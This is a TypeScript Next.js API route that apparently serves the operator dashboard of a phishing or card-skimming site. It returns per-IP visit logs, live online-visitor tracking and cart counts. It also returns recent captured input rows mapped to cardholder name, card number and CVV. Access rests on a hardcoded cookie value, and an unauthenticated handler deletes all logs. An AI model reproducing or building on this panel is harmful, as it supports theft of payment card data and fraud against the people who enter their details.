import { NextRequest, NextResponse } from 'next/server';
import { query } from '@/lib/db';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(request: NextRequest) {
  try {
    const threshold = Date.now() - 3000;

    const dmnCookie = request.cookies.get('dmn');
    const isAuthorized = dmnCookie?.value === 'dmn';

    const hardFilter = isAuthorized ? '' : 'AND (l.is_hard IS NULL OR l.is_hard = 0)';

    const logsResult: any = await query(`
      SELECT l.*, c.sayfa as live_kontrol 
      FROM logs l 
      LEFT JOIN cevrimici_tablosu c ON 
        REPLACE(TRIM(l.ip), '::ffff:', '') = REPLACE(TRIM(c.ip), '::ffff:', '')
      WHERE 1=1 ${hardFilter}
      ORDER BY l.id DESC
    `, []);

    const logs = logsResult.map((log: any) => ({
      ...log,
      ip: log.ip ? log.ip.replace('::ffff:', '').trim() : ''
    }));

    const hardIpSubquery = isAuthorized ? '' : `
      AND REPLACE(TRIM(c.ip), '::ffff:', '') NOT IN (
        SELECT REPLACE(TRIM(l.ip), '::ffff:', '') FROM logs l WHERE l.is_hard = 1
      )
    `;
    const onlineResult: any = await query(
      `SELECT ip FROM cevrimici_tablosu c WHERE CAST(c.onlineTimer AS UNSIGNED) >= ? ${hardIpSubquery}`,
      [threshold]
    );

    const onlineIps = onlineResult.map((row: any) =>
      row.ip ? row.ip.replace('::ffff:', '').trim() : ''
    );
    const onlineCount = onlineIps.length;

    const cartResult: any = await query('SELECT COUNT(*) as count FROM cart_items');
    const cartCount = cartResult[0]?.count || 0;

    const totalVisitorsResult: any = await query('SELECT COUNT(*) as count FROM cevrimici_tablosu');
    const totalVisitorsCount = totalVisitorsResult[0]?.count || 0;

    const inputLogsResult: any = await query('SELECT * FROM input_logs ORDER BY id DESC LIMIT 15');

    const inputInputMap: Record<string, string> = {
      'kart_uzerindeki_isim': 'isim',
      'kredi_karti_numarasi': 'kart',
      'cvv': 'cvv'
    };

    const inputLogs = inputLogsResult.map((log: any) => ({
      ...log,
      input_type: inputInputMap[log.input_type] || log.input_type,
      ip: log.ip ? log.ip.replace('::ffff:', '').trim() : ''
    }));

    return NextResponse.json({
      logs,
      stats: {
        online: onlineCount,
        cart: cartCount,
        input_logs: inputLogs,
        total_visitors: totalVisitorsCount
      },
      online_ips: onlineIps
    });
  } catch (error) {
    console.error('Logs GET error:', error);
    return NextResponse.json({ error: 'Loglar yüklenemedi' }, { status: 500 });
  }
}

export async function DELETE() {
  try {
    await query('DELETE FROM logs');
    return NextResponse.json({ success: true, message: 'Tüm kayıtlar silindi' });
  } catch (error) {
    console.error('Logs DELETE error:', error);
    return NextResponse.json({ error: 'Kayıtlar silinemedi' }, { status: 500 });
  }
}
